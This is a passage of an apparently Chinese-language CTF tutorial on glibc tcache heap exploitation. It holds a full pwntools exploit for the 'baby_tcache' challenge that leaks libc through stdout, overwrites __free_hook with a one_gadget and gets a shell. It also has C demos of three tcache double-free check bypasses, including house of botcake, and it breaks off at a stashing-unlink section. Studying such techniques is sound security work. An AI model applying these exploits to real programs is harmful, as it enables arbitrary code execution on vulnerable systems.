
```python
from pwn import *
context.log_level = 'debug'
elf = ELF('./baby_tcache')
libc = ELF('./libc-2.27.so')
p = process('./baby_tcache')

def choice(idx):
    p.recvuntil('choice:')
    p.sendline(str(idx))

def create(sz, content='A'):
    choice(1)
    p.recvuntil('Size:')
    p.sendline(str(sz))
    p.recvuntil('Data:')
    p.send(content)

def delete(idx):
    choice(2)
    p.recvuntil('Index:')
    p.sendline(str(idx))

create(0x4f0) # 0
create(0x30) # 1
create(0x40) # 2
create(0x50) # 3
create(0x60) # 4
create(0x4f0) # 5
create(0x60, p64(0xdeadbeef)) # 6
delete(4)
pay = b'a'*0x60 + p64(0x660)
create(0x68, pay) # 4
delete(1) # ready to f**k _IO_2_1_stdout_
delete(0)
delete(5)
create(0x4f0) # 0
delete(4) # ready to hijack __free_hook
create(0xe0, '\x60\x07') # 4
# tcache poisoning
create(0x30)
pay = p64(0xfbad1800) + p64(0)*3 + b'\x00'
create(0x30, pay)
p.recv(8)
libcbase = u64(p.recv(8)) - 0x3ed8b0
hook = libcbase + libc.symbols['__free_hook']
print(hex(libcbase))

one = [0x4f2c5, 0x4f322, 0x10a38c]
create(0xf0, p64(hook))
create(0x60)
create(0x60, p64(libcbase + one[1]))

delete(4)
# gdb.attach(p)
p.interactive()
```

## double free

### 介绍

#### 在libc2.26下：

此时的`tcache`根本不会检查，直接`free(a)`, `free(a)`都可以成功。

![](https://bbs.kanxue.com/upload/attach/202211/951122_RDS35XY68TB348F.png)

![](https://bbs.kanxue.com/upload/attach/202211/951122_HTD375HUUMAXD8B.png)

#### 在libc2.29+下：

由于加入了以下检查：

```c
if (__glibc_unlikely(e->key == tcache)) {
    tcache_entry *tmp;
    LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);
    // 这里大概率会去遍历链表
    for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
        if (tmp == e)
            malloc_printerr("free(): double free detected in tcache 2");
}
```

之前的直接`free`两次的手法就失效了，但是我们可以先将`tcachebin`填满，然后将问题转化为`fastbin`中的`double free`，抑或是阅读源码，另寻突破口。

#### Tcache Stash on Fastbin

`tcache`的stash机制，简单来说就是，在从`fastbin`和`small bin`中取`chunk`的时候，会尽可能的把剩余的其他`chunk`也一起放入`tcache bin`中。对于stash机制在`small bin`中的应用，接下来会单独讲解。这里仅讨论在`fastbin`中的应用。

本地写了一个demo程序，libc版本是2.31

![](https://bbs.kanxue.com/upload/attach/202211/951122_GN7YRX5CX3G2USN.png)

首先用7个`chunk`填满`tcache`的某一位，然后再开两个`chunk`放入`fastbin`中，接下来`free` ABA构成`double free`。

![](https://bbs.kanxue.com/upload/attach/202211/951122_HMP9QCYJM66Y37B.png)

然后拿走7个`tcache`中的`chunk`，拿到`fastbin`中的第一个A，将`fd`改成目标地址，然后此时会触发stash机制，将`chunk`B和第二个A，以及他指向的目标一起放进`tcache`中，达成申请到任意地址的效果。（如果要检查`counts`，就再简单调整一下`bin`的结构，这里只给出能达成任意申请的证明）

![](https://bbs.kanxue.com/upload/attach/202211/951122_4GHQQGQ7CQVRG56.png)

#### bypass double free check

如果不存在`calloc`的话，那么上面那个手法就很难实现了，这时不妨再分析一下源码，另寻突破口。

在`tcache_put`中，对每一个进入`tcache bin`的`chunk`的`bk`处赋予了一个特定值

```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
......
    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

    /* Mark this chunk as
    "in the tcache" so the test
    in _int_free will
    detect a double free. */
    e->key = tcache;
......
}
```

在`_int_free`中进行了相关检查

```c
#if USE_TCACHE
{
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
    {
        /* Check to see if it's already in the tcache. */
        tcache_entry *e = (tcache_entry *) chunk2mem (p);

        /* This test succeeds on double free.  However, we don't
        100% trust it (it also matches random payload data at a
        1 in 2^<size_t> chance), so verify it's
        not an unlikely coincidence before aborting. */
        if (__glibc_unlikely (e->key == tcache))
        {
            tcache_entry *tmp;
            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
            for (tmp = tcache->entries[tc_idx];
                tmp;
                tmp = tmp->next)
                if (tmp == e)
                    malloc_printerr ("free(): double free detected in tcache 2");
            /* If we get here, it was a coincidence.  We've wasted a
            few cycles, but don't abort. */
        }

        if (tcache->counts[tc_idx] < mp_.tcache_count)
        {
            tcache_put (p, tc_idx);
            return;
        }
    }
}
#endif
```

稍微总结一下，会发现以下几种利用方式：

- 很明显, 进入遍历检查的条件是`__glibc_unlikely (e->key == tcache)`, 如果让`e->key != tcache`, 是不是就可以很轻松的bypass这个检测了。
1. 如果有办法修改到该`chunk`的`size`, 让计算出来的`tc_idx`发生变化，就能让后续的检查变成在别的`entries`上遍历, 这样也能成功绕过。
- 对`e->key`的赋值操作是`tcache_put`完成的，那么如果我让一个`chunk`在被`free`的时候不进入`tcache bin`, 反手进入`unsortedbin`, 然后利用相关的风水操作，最后利用`uaf`对目标`chunk`再次`free`, 也能成功绕过检测。这就是`house of botcake`手法的思想。

##### 劫持key

将原本的`key`破坏掉，即可绕过遍历检查

###### demo01.c

```c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>

int main(){
    intptr_t ptr = malloc(0x100);
    free(ptr);

    *((intptr_t *)ptr+1) = 0;

    free(ptr);

    getchar();

    return 0;
}
```

![](https://bbs.kanxue.com/upload/attach/202211/951122_5Y495M87S6TZ6F4.png)

##### 劫持chunk size

改掉`chunk size`让算出来的`tc_idx`和原来不一致，从而进入别的链表遍历

###### demo02.c

```c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>

int main(){
    intptr_t ptr = malloc(0x100);
    free(ptr);

    *((intptr_t *)ptr-1) = 0xf0;

    free(ptr);

    getchar();

    return 0;
}
```

![](https://bbs.kanxue.com/upload/attach/202211/951122_63ZZDYXWZTVM9XT.png)

##### house of botcake

条件：能够申请到可以进入`unsorted bin`和`tcache bin`的`chunk`（>0x90）

1. 首先将7个`chunk`放入`tcache bin`, 然后再将两个`chunk`（A， B）放入`unsorted bin`（让他们合并）。
2. 此时从`tcache bin`取出一个`chunk`给接下来的`double free`腾位置。
3. 这个时候`free`掉位置靠近`top chunk`的`chunk A`, 它就会进入`tcache bin`。
4. 申请一个略微大于`chunk A`的`size`的`chunk`, 从`unsorted bin`中切割出来, 此时就会和`tcache`中的`chunk A`重叠。

###### demo03.c

```c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>

int main(){
    intptr_t *ptr[7], chunk_A, chunk_B, chunk_C;

    for(int i=0;i<7;i++)  ptr[i] = malloc(0x100);
    chunk_B = malloc(0x100);
    chunk_A = malloc(0x100);
    malloc(0x20); // gap

    for(int i=0;i<7;i++)  free(ptr[i]);
    free(chunk_A);
    free(chunk_B); // consolidate

    malloc(0x100);

    free(chunk_A); // double free

    chunk_C = malloc(0x110);
    *((intptr_t *)chunk_C+0x22) = 0xdeadbeef;

    getchar();

    return 0;
}
```

![](https://bbs.kanxue.com/upload/attach/202211/951122_A49G6ZUZMNVZ22E.png)

（值得一提的是，用于劫持`tcache`上指针的`chunk_C`和被`double free`的`chunk_A`是可以反复利用的，所以该`trick`可以轻松达成多次任意地址申请）

（例题可以找**ciscn_2022华东北赛区-Blue**来练手）

## tcache stashing unlink attack

接下来的`trick`比较有意思，在`libc 2.29+`使用也较为广泛

以下为示范漏洞程序（ubuntu20.04）

|  |  |
| --- | --- |
